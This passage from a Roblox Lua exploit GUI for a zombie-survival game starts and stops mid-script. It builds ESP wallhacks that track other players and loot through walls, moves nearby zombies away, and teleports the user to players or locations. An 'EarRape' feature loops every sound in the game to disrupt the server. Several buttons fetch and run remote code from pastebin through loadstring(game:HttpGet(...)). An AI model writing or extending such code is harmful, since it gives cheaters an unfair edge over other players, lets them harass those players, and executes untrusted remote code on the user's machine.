			if game.Workspace.Characters:FindFirstChild(player) and game.Workspace.Characters[player]:FindFirstChild("Head") and game.Workspace.Characters:FindFirstChild(player).Head:FindFirstChild("Beam") == nil then
				local at1 = Instance.new("Attachment",game.Workspace.Characters[player].Head)
				local at2 = Instance.new("Attachment",game.Workspace.Characters[player].Head)
				local b = Instance.new("Beam",game.Workspace.Characters[player].Head)
				at1.Position = Vector3.new(0,250,0)
				at1.Name = "Beam_att"
				at2.Name = "Beam_att2"
				b.Attachment0 = at1
				b.Attachment1 = at2
				b.CurveSize0 = 250
				b.CurveSize1 = 250
				b.Segments = 2
				b.Width0 = 0.2
				b.Width1 = 0.2
				b.FaceCamera = true
				b.ZOffset = 1
				b.TextureLength = 1.75
				b.LightInfluence = 0
				b.LightEmission = 1
				b.Enabled = true
				b.TextureSpeed = 1
				b.Color = ColorSequence.new(Color3.fromRGB(180,14,14))
				
			end
			
		end
		
		function Rem_BEAM(player)
			if game.Workspace.Characters:FindFirstChild(player) and game.Workspace.Characters[player]:FindFirstChild("Head") and game.Workspace.Characters:FindFirstChild(player).Head:FindFirstChild("Beam") ~= nil then
				if game.Workspace.Characters[player].Head:FindFirstChild("Beam_att") then
					game.Workspace.Characters[player].Head:FindFirstChild("Beam_att"):Destroy()
				end
				if game.Workspace.Characters[player].Head:FindFirstChild("Beam_att2") then
					game.Workspace.Characters[player].Head:FindFirstChild("Beam_att2"):Destroy()
				end
				
				game.Workspace.Characters:FindFirstChild(player).Head:FindFirstChild("Beam"):Destroy()
				
			end
		end
		
		--IMP
		function important(player)
			
			
		end
		
		function unimportant(player)
		end
		
		--TRACK ITEM
		function Show_Track(name,pos)
			if tracks[tostring(pos)] and tracks[tostring(pos)].Name == name then
				if not game.Workspace:FindFirstChild("ItemTrackers") then
					local f = Instance.new("Folder",game.Workspace)
					f.Name = "ItemTrackers"
				end
				
				local p = Instance.new("Part")
				local val = Instance.new("StringValue",p)
				val.Name = "CFPos"
				val.Value = tostring(pos)
				p.Name = "Tracker_"..name.."_".. tostring(pos)
				--print(p.Name)
				p.Anchored = true
				p.CanCollide = false
				p.Size = Vector3.new(0.2,0.2,0.2)
				p.Transparency = 1
				p.CFrame = CFrame.new(pos.X,pos.Y,pos.Z)
				p.Parent = game.Workspace.ItemTrackers
				create_ESP_UI(name,p,"Item",pos)
				
			end
		end
		
		function Rem_Track(name,pos)
			--print("REMOVING "..name)
			if tracks[tostring(pos)] and tracks[tostring(pos)].Name == name and game.Workspace:FindFirstChild("ItemTrackers") then
				--print("THIS FAR")
				--print("Tracker_"..name.."_".. tostring(pos))
				if game.Workspace.ItemTrackers:FindFirstChild("Tracker_"..name.."_".. tostring(pos)) then
					--print("NOW HERE")
					game.Workspace.ItemTrackers:FindFirstChild("Tracker_"..name.."_".. tostring(pos)):Destroy()
					--print(name)
					if UIstorage:FindFirstChild('Tracker_'..name.."_".. tostring(pos)) then
						UIstorage['Tracker_'..name.."_".. tostring(pos)]:Destroy()
					end
					
				end
			end
			
		end
		
		--UPDATE ITEM SEARCH
		SearchBox.Changed:Connect(function(prop)
			if prop == "Text" then
				look_for(SearchBox.Text)
			end
		end)
		
		--ITEM FIND
		
		function look_for(name)
			--CLEAR PREVIOUS FRAMES
			if name ~= "" and string.len(name) > 1 then
				for x,old in pairs(Results:GetChildren()) do
					if old:IsA("Frame") then
						if tracks[tostring(old.PosVal.TruePos.Value)] then
							tracks[tostring(old.PosVal.TruePos.Value)] = nil
						end
						old:Destroy()
					end
				end
				--
				
				for i,sec in pairs(game.Workspace.Loot:GetChildren()) do
					if #sec:GetChildren() > 0 then
						for z,item in pairs(sec:GetChildren()) do
							local iname = string.lower(item.Name)
							local fname = string.lower(name)
						
							if string.find(iname,fname) then
								add_to_results("ItemSearch",item.Name,Vector3.new(item.Value.X,item.Value.Y,item.Value.Z))
							end
						end
					end
				end
			end
		end
		
		function add_to_results(rtype,name,pos)
			if rtype == "ItemSearch" then
				--
				local ITEMNAMEHERE = Instance.new("Frame")
				local ItemName = Instance.new("TextButton")
				local Track = Instance.new("TextButton")
				local PosVal = Instance.new("TextButton")
				local TruePos = Instance.new("Vector3Value",PosVal)
				TruePos.Name = "TruePos"
				--Properties:
				ITEMNAMEHERE.Name = "ITEMNAMEHERE"
				ITEMNAMEHERE.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
				ITEMNAMEHERE.BackgroundTransparency = 1
				ITEMNAMEHERE.BorderSizePixel = 0
				ITEMNAMEHERE.Size = UDim2.new(1, 0, 0.109999999, 0)
				ITEMNAMEHERE.SizeConstraint = Enum.SizeConstraint.RelativeXX
				ITEMNAMEHERE.Visible = false
				
				
				ItemName.Name = "ItemName"
				ItemName.Parent = ITEMNAMEHERE
				ItemName.AnchorPoint = Vector2.new(1, 0)
				ItemName.BackgroundColor3 = Color3.new(0.796079, 0.796079, 0.796079)
				ItemName.BorderSizePixel = 0
				ItemName.Position = UDim2.new(1, 0, 0, 0)
				ItemName.Size = UDim2.new(0.800000012, 0, 0.5, 0)
				ItemName.Font = Enum.Font.SourceSansBold
				ItemName.Text = "Item Name Unavailable"
				ItemName.TextColor3 = Color3.new(0.117647, 0.117647, 0.117647)
				ItemName.TextSize = 14
				ItemName.TextWrapped = true
				
				Track.Name = "Track"
				Track.Parent = ITEMNAMEHERE
				Track.AnchorPoint = Vector2.new(0, 0.5)
				Track.BackgroundColor3 = Color3.new(1, 1, 1)
				Track.BackgroundTransparency = 0.5
				Track.BorderSizePixel = 0
				Track.Position = UDim2.new(0, 0, 0.5, 0)
				Track.Size = UDim2.new(0.180000007, 0, 0.75, 0)
				Track.Font = Enum.Font.SourceSansBold
				Track.Text = "Track"
				Track.TextColor3 = Color3.new(1, 1, 1)
				Track.TextSize = 14
				
				PosVal.Name = "PosVal"
				PosVal.Parent = ITEMNAMEHERE
				PosVal.AnchorPoint = Vector2.new(1, 1)
				PosVal.BackgroundColor3 = Color3.new(0.654902, 0.654902, 0.654902)
				PosVal.BorderSizePixel = 0
				PosVal.Position = UDim2.new(1, 0, 1, 0)
				PosVal.Size = UDim2.new(0.800000012, 0, 0.5, 0)
				PosVal.Font = Enum.Font.SourceSansBold
				PosVal.Text = "Position: (1111,2222,3333)"
				PosVal.TextColor3 = Color3.new(0.117647, 0.117647, 0.117647)
				PosVal.TextSize = 14
				PosVal.TextWrapped = true
				
				ITEMNAMEHERE.LayoutOrder = game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(pos.X,pos.Y,pos.Z))
				ITEMNAMEHERE.Visible = true
				--
				ITEMNAMEHERE.Name = name
				ITEMNAMEHERE.ItemName.Text = name
				ITEMNAMEHERE.PosVal.Text = "Position: (".. tostring(pos)..")"
				ITEMNAMEHERE.PosVal.TruePos.Value = Vector3.new(pos.X,pos.Y,pos.Z)
				ITEMNAMEHERE.Parent = Results
				
				update_list_len(Results,ITEMNAMEHERE.Size.Y.Offset)
				
				if not tracks[tostring(pos)] then
					tracks[tostring(pos)] = {
						Name = name,
						AscIn = ITEMNAMEHERE,
						Tracked = false,
					}
				end
				
				Track.MouseButton1Click:connect(function()
					if tracks[tostring(pos)] then
						tracks[tostring(pos)].Tracked = not tracks[tostring(pos)].Tracked
						if tracks[tostring(pos)].Tracked == true then
							Show_Track(name,pos)
							Track.BackgroundColor3 = colors.On
						elseif tracks[tostring(pos)].Tracked == false then
							Rem_Track(name,pos)
							Track.BackgroundColor3 = colors.Off
						end
					end 
				end)
			end	
		end	
		
		
		--ESP
		
		function update_info(player,TUD)
			if info[player] and playerlist:FindFirstChild(player) then
				
				if info[player].ESPEnabled == true and (TUD == "EBI" or TUD == "E") then
					playerlist:FindFirstChild(player).EnabledStatus.BackgroundColor3 = colors.On
					playerlist:FindFirstChild(player).EnabledStatus.Transparency = 0.2
					Show_ESP(player)
				elseif info[player].ESPEnabled == false and (TUD == "EBI" or TUD == "E") then
					playerlist:FindFirstChild(player).EnabledStatus.BackgroundColor3 = colors.Off
					playerlist:FindFirstChild(player).EnabledStatus.Transparency = 0.5
					Rem_ESP(player)
				end
				
				if info[player].BeamEnabled == true and (TUD == "EBI" or TUD == "B") then
					playerlist:FindFirstChild(player).BeamStatus.BackgroundColor3 = colors.On
					playerlist:FindFirstChild(player).BeamStatus.Transparency = 0.2
					Show_BEAM(player)
				elseif info[player].BeamEnabled == false and (TUD == "EBI" or TUD == "B") then
					playerlist:FindFirstChild(player).BeamStatus.BackgroundColor3 = colors.Off
					playerlist:FindFirstChild(player).BeamStatus.Transparency = 0.5
					Rem_BEAM(player)
				end
				
				if info[player].Important == true and (TUD == "EBI" or TUD == "I") then
					playerlist:FindFirstChild(player).Important.BackgroundColor3 = colors.Imp
					playerlist:FindFirstChild(player).Important.Transparency = 0.2
					important(player)
				elseif info[player].Important == false and (TUD == "EBI" or TUD == "I") then
					playerlist:FindFirstChild(player).Important.BackgroundColor3 = colors.Off
					playerlist:FindFirstChild(player).Important.Transparency = 0.5
					unimportant(player)
				end
				
				
			end
			
		end
		
		for i,plr in pairs(plrs) do --CHANGE
			local PLAYERNAMEHERE = Instance.new("Frame",playerlist)
				local PlayerName = Instance.new("TextButton")
				local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
				local EnabledStatus = Instance.new("TextButton")
				local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
				local Important = Instance.new("TextButton")
				local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
				local BeamStatus = Instance.new("TextButton")
				local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
				PLAYERNAMEHERE.Name = "PLAYERNAMEHERE"
				PLAYERNAMEHERE.Parent = Templates
				PLAYERNAMEHERE.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
				PLAYERNAMEHERE.BackgroundTransparency = 1
				PLAYERNAMEHERE.BorderSizePixel = 0
				PLAYERNAMEHERE.Size = UDim2.new(1, -10, 0, 30)
				PLAYERNAMEHERE.Visible = true
				
				PlayerName.Name = "PlayerName"
				PlayerName.Parent = PLAYERNAMEHERE
				PlayerName.AnchorPoint = Vector2.new(1, 0)
				PlayerName.BackgroundColor3 = Color3.new(0.796079, 0.796079, 0.796079)
				PlayerName.BackgroundTransparency = 0.80000001192093
				PlayerName.BorderSizePixel = 0
				PlayerName.Position = UDim2.new(1, 0, 0, 0)
				PlayerName.Size = UDim2.new(0.75999999, 0, 1, 0)
				PlayerName.Font = Enum.Font.SourceSansBold
				PlayerName.Text = "PLAYER NAME HERE"
				PlayerName.TextColor3 = Color3.new(1, 1, 1)
				PlayerName.TextScaled = true
				PlayerName.TextSize = 14
				PlayerName.TextWrapped = true
				
				UITextSizeConstraint.Parent = PlayerName
				UITextSizeConstraint.MaxTextSize = 20
				
				EnabledStatus.Name = "EnabledStatus"
				EnabledStatus.Parent = PLAYERNAMEHERE
				EnabledStatus.AnchorPoint = Vector2.new(0, 0.5)
				EnabledStatus.BackgroundColor3 = Color3.new(1, 1, 1)
				EnabledStatus.BackgroundTransparency = 0.5
				EnabledStatus.BorderSizePixel = 0
				EnabledStatus.Position = UDim2.new(0, 0, 0.5, 0)
				EnabledStatus.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				EnabledStatus.SizeConstraint = Enum.SizeConstraint.RelativeYY
				EnabledStatus.Font = Enum.Font.SourceSansBold
				EnabledStatus.Text = " "
				EnabledStatus.TextColor3 = Color3.new(0, 0, 0)
				EnabledStatus.TextScaled = true
				EnabledStatus.TextSize = 14
				EnabledStatus.TextWrapped = true
				
				UITextSizeConstraint_2.Parent = EnabledStatus
				UITextSizeConstraint_2.MaxTextSize = 15
				
				Important.Name = "Important"
				Important.Parent = PLAYERNAMEHERE
				Important.AnchorPoint = Vector2.new(0, 0.5)
				Important.BackgroundColor3 = Color3.new(1, 1, 1)
				Important.BackgroundTransparency = 0.5
				Important.BorderSizePixel = 0
				Important.Position = UDim2.new(0.159999996, 0, 0.5, 0)
				Important.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				Important.SizeConstraint = Enum.SizeConstraint.RelativeYY
				Important.Font = Enum.Font.SourceSansBold
				Important.Text = " "
				Important.TextColor3 = Color3.new(0, 0, 0)
				Important.TextSize = 14
				
				UITextSizeConstraint_3.Parent = Important
				UITextSizeConstraint_3.MaxTextSize = 15
				
				BeamStatus.Name = "BeamStatus"
				BeamStatus.Parent = PLAYERNAMEHERE
				BeamStatus.AnchorPoint = Vector2.new(0, 0.5)
				BeamStatus.BackgroundColor3 = Color3.new(1, 1, 1)
				BeamStatus.BackgroundTransparency = 0.5
				BeamStatus.BorderSizePixel = 0
				BeamStatus.Position = UDim2.new(0.0799999982, 0, 0.5, 0)
				BeamStatus.Size = UDim2.new(0.5, 0, 0.800000012, 0)
				BeamStatus.SizeConstraint = Enum.SizeConstraint.RelativeYY
				BeamStatus.Font = Enum.Font.SourceSansBold
				BeamStatus.Text = " "
				BeamStatus.TextColor3 = Color3.new(0, 0, 0)
				BeamStatus.TextSize = 14
				
				UITextSizeConstraint_4.Parent = BeamStatus
				UITextSizeConstraint_4.MaxTextSize = 15
		
				PLAYERNAMEHERE.Name = plr.Name
				PLAYERNAMEHERE.PlayerName.Text = plr.Name
				
				
				if not info[plr.Name] then
					info[plr.Name] = {
					ESPEnabled = true,
					BeamEnabled = false,
					Important = false,
					}
				end
				PLAYERNAMEHERE.Parent = playerlist
				update_info(plr.Name,"EBI")
				
				PLAYERNAMEHERE.BeamStatus.MouseButton1Click:connect(function()
					if info[plr.Name] then
						info[plr.Name].BeamEnabled = not info[plr.Name].BeamEnabled
						update_info(plr.Name,"B")
					end
				end)
				
				PLAYERNAMEHERE.EnabledStatus.MouseButton1Click:connect(function()
					if info[plr.Name] then
						info[plr.Name].ESPEnabled = not info[plr.Name].ESPEnabled
						update_info(plr.Name,"E")
					end
				end)
				
				PLAYERNAMEHERE.Important.MouseButton1Click:connect(function()
					if info[plr.Name] then
						info[plr.Name].Important = not info[plr.Name].Important
						update_info(plr.Name,"I")
					end
				end)
		end
		
	--CONSTANT LOOP REFRESH
	
	local Radius = 100
	
	local n = Vector3.new(1, 0, 1) 
	local cam = workspace.CurrentCamera 
	local pi = math.pi
	
	function angleBetween(aVec, bVec)	
		local project = aVec:Dot(bVec)
		local magProd = aVec.magnitude*bVec.magnitude
		local angle = math.acos(project/magProd)
		return angle
	end
	
	local NearbyPlayers = {}
	local Zamt = 0
	
	local deb = 0
	
	local arrowtemplate = Instance.new("ImageLabel")
	arrowtemplate.Size = UDim2.new(0.05,0,0.05,0)
	arrowtemplate.SizeConstraint = Enum.SizeConstraint.RelativeYY
	arrowtemplate.Image = "rbxassetid://3259239695"
	arrowtemplate.BackgroundTransparency = 1
	
	local ArrowFolder = Instance.new("Folder",ESP)
	ArrowFolder.Name = "ArrowFolder"
	local ZArrowFolder = Instance.new("Folder",ESP)
	ZArrowFolder.Name = "ZArrowFolder"
	
	
	while wait(0.025) do
		if not paused then
			deb = deb + 1
			local c = coroutine.wrap(function()
				for i,v in pairs(ZArrowFolder:GetChildren()) do
					v:Destroy()
				end
				
				Zamt = 0
	
				for i,v in pairs(game.Workspace.Zombies.Mobs:GetChildren()) do
					if v:FindFirstChild("Head") and game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name) then
						local dist = math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(v.Head.Position))
						if dist <= maxzeddet then
							local pos, visible = cam:WorldToViewportPoint(v.Head.Position)
							if not visible then
								pcall(function()
									Zamt = Zamt + 1
									local Image = arrowtemplate:Clone()
									Image.Name = tostring(2000-Zamt).."_Zombie"
									Image.ImageColor3 = Color3.fromRGB(85,170,0)
									Image.Parent = ZArrowFolder
									local rVec = (cam.CFrame.rightVector * n).unit
									local aVec = (cam.CFrame.lookVector * n).unit
									local bVec = (v.Head.Position * n - cam.CFrame.p * n).unit
										
										
									local onRight = angleBetween(bVec, rVec) < pi/2
									local angle = angleBetween(aVec, bVec) * (onRight and 1 or -1)
										
									    -- Position and rotate
									
									Image.Rotation = math.deg(angle) + 180
									Image.Position = UDim2.new(0.5, Radius*math.cos(angle - pi/2), 0.5, Radius*math.sin(angle - pi/2))
								end)
								
							end	
						end
						if not game.CoreGui:FindFirstChild("ZombieNodes") then
							local ZombieNodes = Instance.new("Folder",game.CoreGui)
							ZombieNodes.Name = "ZombieNodes"
						end
						
						if not v.Head:FindFirstChild("Tracked") then
							local val = Instance.new("BoolValue",v.Head)
							val.Name = "Tracked"
							local bb = Instance.new('BillboardGui',UIstorage.ZombieNodes)
							bb.Adornee = v.Head
							bb.ExtentsOffset = Vector3.new(0,2,0)
							bb.AlwaysOnTop = true
							bb.MaxDistance = 300
							bb.Size = UDim2.new(1,5,1,5)
							bb.StudsOffset = Vector3.new(0,1,0)
							bb.Name = "tracker"
							local icon = Instance.new("ImageLabel",bb)
							icon.Name = "Icon"
							icon.Size = UDim2.new(1,0,1,0)
							icon.Transparency = 1
							icon.Image = "rbxassetid://3612400171"
							icon.ImageColor3 = Color3.fromRGB(170, 255, 127)
							
							v.AncestryChanged:connect(function()
							    if not v:IsDescendantOf(game) then
							        bb:Destroy()
							    end
							end)
						end
						
					end
				end
				if not game.CoreGui:FindFirstChild("ZombieNodes") then
					local ZombieNodes = Instance.new("Folder",game.CoreGui)
					ZombieNodes.Name = "ZombieNodes"
				end
				
				for _,ui in pairs(UIstorage.ZombieNodes:GetChildren()) do
					if ZombieESPEnabled then
						ui.Enabled = true
					else
						ui.Enabled = false
					end
				end
				
				for i,char in pairs(game.Workspace.Characters:GetChildren()) do
					if char.Name ~= game.Players.LocalPlayer.Name and game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name) and shadowlist[char.Name] == nil and UIstorage:FindFirstChild("tracker_"..char.Name) and char:FindFirstChild("Head") then
						local dist = math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(char.Head.Position))
						if dist <= maxplrdet then
							local pos, visible = cam:WorldToViewportPoint(char.Head.Position)
							if not visible then
								local Image = nil
								if NearbyPlayers[char.Name] == nil then
									NearbyPlayers[char.Name] = {"true"}
									local a = arrowtemplate:Clone()
									a.Name = char.Name
									a.ImageColor3 = Color3.fromRGB(255,0,0)
									a.Parent = ArrowFolder
									game:GetService("Debris"):AddItem(a,2)
								--	print("NEARBY "..char.Name)
								--elseif ArrowFolder:FindFirstChild("char.Name") then
								elseif NearbyPlayers[char.Name] and not ArrowFolder:FindFirstChild(char.Name) then
									local a = arrowtemplate:Clone()
									a.Name = char.Name
									a.ImageColor3 = Color3.fromRGB(255,0,0)
									a.Parent = ArrowFolder
									game:GetService("Debris"):AddItem(a,2)
									--print("NEARBY "..char.Name)
								end
								if ArrowFolder:FindFirstChild(char.Name) then
									Image = ArrowFolder[char.Name]
								end
								local rVec = (cam.CFrame.rightVector * n).unit
								local aVec = (cam.CFrame.lookVector * n).unit
								local bVec = (char.Head.Position * n - cam.CFrame.p * n).unit
								
								
								local onRight = angleBetween(bVec, rVec) < pi/2
								local angle = angleBetween(aVec, bVec) * (onRight and 1 or -1)
								
							    -- Position and rotate
								if Image ~= nil then
									Image.Rotation = math.deg(angle) + 180
									Image.Position = UDim2.new(0.5, Radius*math.cos(angle - pi/2), 0.5, Radius*math.sin(angle - pi/2))
									--Image.Visible = true
								end
							elseif visible == true and NearbyPlayers[char.Name] and ArrowFolder:FindFirstChild(char.Name) then
								pcall(function()
									ArrowFolder[char.Name]:Destroy()
									NearbyPlayers[char.Name] = nil	
								end)
									
							end
						elseif dist > maxplrdet and NearbyPlayers[char.Name] and ArrowFolder:FindFirstChild(char.Name) then
							pcall(function()
								ArrowFolder[char.Name]:Destroy()
								NearbyPlayers[char.Name] = nil	
							end)	
						end
					end
				end
			end)
			c()
			local d = coroutine.wrap(function()
				if deb >= 20 then
					deb = 0
					for i,char in pairs(game.Workspace.Characters:GetChildren()) do
			            if PlayerESPEnabled and char.Name ~= game.Players.LocalPlayer.Name and shadowlist[char.Name] == nil and UIstorage:FindFirstChild("tracker_"..char.Name) and char:FindFirstChild("Head") then
			                local dist = 9999
							if game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name) then
								dist = math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(char.Head.Position))
							end
			                if dist >= maxdistance and info[char.Name] and info[char.Name].Important == false then
			                    UIstorage["tracker_"..char.Name].Enabled = false
			                else
			                    UIstorage["tracker_"..char.Name].Enabled = true
			                end
			                UIstorage["tracker_"..char.Name].TextLabel.Text = char.Name.."("..dist..")"
			                if dist <= 250 then
				                --RED
				                UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = Color3.fromRGB(255,0,0)
				                UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = Color3.fromRGB(255,0,0)
				                UIstorage["tracker_"..char.Name].TextLabel.TextTransparency = 0
				           	elseif dist > 250 and dist < 750 then
				                --YELLOW
				                UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = Color3.fromRGB(255,255,0)
				                UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = Color3.fromRGB(255,255,0)
				                UIstorage["tracker_"..char.Name].TextLabel.TextTransparency = 0
				           	elseif dist >= 750 then
				                --GREEN
				                UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = Color3.fromRGB(0,255,0)
				                UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = Color3.fromRGB(0,255,0)
				                UIstorage["tracker_"..char.Name].TextLabel.TextTransparency = 0.3
			                end
			
			                if info[char.Name] then
			                    if info[char.Name].Important == true then
			                       
			                        if dist > 250 and dist < 750 then
			                            UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = colors.Imp 
			                            UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = Color3.fromRGB(255,255,0)
			                        elseif dist <= 250 then
			                            UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = Color3.fromRGB(255,0,0)
			                            UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = colors.Imp
			                        elseif dist >= 750 then
			                            UIstorage["tracker_"..char.Name].TextLabel.TextColor3 = colors.Imp 
			                            UIstorage["tracker_"..char.Name].Frame.BackgroundColor3 = colors.Imp
			                        end
			                       
			                    end
			                    if info[char.Name].ESPEnabled == true then
			                        UIstorage["tracker_"..char.Name].TextLabel.Visible = true
			                        UIstorage["tracker_"..char.Name].Frame.Visible = true
			                    elseif info[char.Name].ESPEnabled == false or shadowlist[char.Name] ~= nil then
			                        if info[char.Name].Important == false or shadowlist[char.Name] ~= nil then
			                            UIstorage["tracker_"..char.Name].TextLabel.Visible = false
			                            UIstorage["tracker_"..char.Name].Frame.Visible = false
			                        end
								end
			                end
						elseif not PlayerESPEnabled and char.Name ~= game.Players.LocalPlayer.Name and shadowlist[char.Name] == nil and UIstorage:FindFirstChild("tracker_"..char.Name) then
							UIstorage["tracker_"..char.Name].TextLabel.Visible = false
			                UIstorage["tracker_"..char.Name].Frame.Visible = false
						end
					end
					--item tracker
			        if game.Workspace:FindFirstChild("ItemTrackers") and #game.Workspace:FindFirstChild("ItemTrackers"):GetChildren() > 0 then
			            for x,tr in pairs(game.Workspace:FindFirstChild("ItemTrackers"):GetChildren()) do
							local dist = 9999
							if game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name) then
								dist = math.ceil(game.Players.LocalPlayer:DistanceFromCharacter(tr.Position))
							end
			                UIstorage[tr.Name].TextLabel.Text = tracks[tr.CFPos.Value].Name.."("..dist..")"
			            end
			        end
				end
			end)
			d()
		end
	end

end
coroutine.resume(coroutine.create(SCRIPT_ZBST85_FAKESCRIPT))
function SCRIPT_DEOY68_FAKESCRIPT() -- Aimbot.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Aimbot
	script.Parent.MouseButton1Down:connect(function()
	game.Lighting.Sound:play()
	game.StarterGui:SetCore("SendNotification",{
				Title = "Misc";
				Text = "Aimbot Loaded.";
				Duration = 6
	        })
	loadstring(game:HttpGet('https://pastebin.com/raw/UbAkN0yR'))() 
	script.Parent.Text = "AIMBOT LOADED : Q"
	script.Parent.Active = false
	end)
	

end
coroutine.resume(coroutine.create(SCRIPT_DEOY68_FAKESCRIPT))
function SCRIPT_TMMT80_FAKESCRIPT() -- RGBWeapons.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = RGBWeapons
	script.parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		Rainbow = not Rainbow
	    if Rainbow == false then
		end
		if Rainbow == true then
	    local rainbow = 0
	game.StarterGui:SetCore("SendNotification",{
				Title = "Misc";
				Text = "RGB Weapons Loaded.";
				Duration = 6
	        })
			
			game:GetService('RunService').RenderStepped:connect(function()
				rainbow = rainbow + .01
				if rainbow > 1 then
					rainbow = 0
				end
					for i,v in pairs(game.Players.LocalPlayer.Character.Equipped:GetDescendants()) do
						if v:IsA'BasePart' then
							v.Color = Color3.fromHSV(rainbow,1,1)
					end
				end
			end)
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_TMMT80_FAKESCRIPT))
function SCRIPT_GYPC78_FAKESCRIPT() -- AntiZed.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = AntiZed
	script.parent.MouseButton1Down:connect(function()
	game.Lighting.Sound:play()
	game.StarterGui:SetCore("SendNotification",{
				Title = "Misc";
				Text = "Anti Zombies Loaded.";
				Duration = 6
	        })
	game:GetService'RunService'.RenderStepped:connect(function()
	    for _,zombie in next, workspace.Zombies.Mobs:GetChildren() do 
	        if (zombie.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 35 then
	            zombie.HumanoidRootPart.CFrame = zombie.HumanoidRootPart.CFrame - Vector3.new(0,50,0)
				zombie.Humanoid:ChangeState(15)
	        end
	    end
	end)
	end)

end
coroutine.resume(coroutine.create(SCRIPT_GYPC78_FAKESCRIPT))
function SCRIPT_WIKV70_FAKESCRIPT() -- EarRape.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = EarRape
	script.parent.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification",{
				Title = "Misc";
				Text = "Server Death Initiated.";
				Duration = 6
	        })
		game.Lighting.Sound:play()
		while wait() do
	    for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("Sound") then 
		v:Play()
		end
		end
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_WIKV70_FAKESCRIPT))
function SCRIPT_CFER75_FAKESCRIPT() -- Shaders.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Shaders
	script.parent.MouseButton1Down:connect(function()
	game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "Misc";
				Text = "Shaders Mod Loaded.";
				Duration = 6
	        })
	local cc = game.Lighting.ColorCorrection
	cc.Brightness = 0.05
	cc.Contrast = 0.2
	cc.Saturation = 0.1
	cc.TintColor = Color3.fromRGB(230,230,230)
	
	local blur = Instance.new("BlurEffect", game.Lighting)
	blur.Size = 2
	blur.Enabled = true
	
	game:GetService'RunService'.RenderStepped:connect(function()
	local lighting = game:GetService("Lighting")
	lighting.OutdoorAmbient = Color3.new(144/255, 144/255, 144/255)
	lighting.GlobalShadows = true
	lighting.Brightness = 1.5
	lighting.Ambient = Color3.new(0/255, 0/255, 0/255)
	lighting.ShadowColor = Color3.new(61/255, 61/255, 61/255)
	end)
	
	end)

end
coroutine.resume(coroutine.create(SCRIPT_CFER75_FAKESCRIPT))
function SCRIPT_QOIL75_FAKESCRIPT() -- Loc.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Loc
	script.Parent.FocusLost:connect(function(xx)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Teleporting to "..script.Parent.Text..".";
				Duration = 6
		        })
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Locations[script.Parent.Text].CFrame
		loadstring(game:HttpGet('https://pastebin.com/raw/FaBGugbE'))() 
			wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			wait(4)
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	end)

end
coroutine.resume(coroutine.create(SCRIPT_QOIL75_FAKESCRIPT))
function SCRIPT_PKVE79_FAKESCRIPT() -- Plr.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Plr
	script.Parent.FocusLost:connect(function(io)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Teleporting to "..script.Parent.Text..".";
				Duration = 6
		        })
				local Characters = game.Workspace.Characters
				local LocalPlayer = game.Players.LocalPlayer
				local function RemoveSpaces(String)
					return String:gsub("%s+", "") or String
				end
				
				local function FindPlayer(String)
					String = RemoveSpaces(String)
					for _, _Player in pairs(Characters:GetChildren()) do
						if _Player.Name:lower():match('^'.. String:lower()) then
							return _Player
						end
					end
					return nil
				end
				
				local Target = FindPlayer(script.Parent.Text)
					if Target and Target.HumanoidRootPart then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.HumanoidRootPart.CFrame
					loadstring(game:HttpGet('https://pastebin.com/raw/FaBGugbE'))() 
					wait(0.2)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					wait(4)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end			
	end)

end
coroutine.resume(coroutine.create(SCRIPT_PKVE79_FAKESCRIPT))
function SCRIPT_GRNP75_FAKESCRIPT() -- Crpse.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Crpse
	script.Parent.FocusLost:connect(function(io)
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "LocalPlayer";
				Text = "Teleporting to "..script.Parent.Text..".";
				Duration = 6
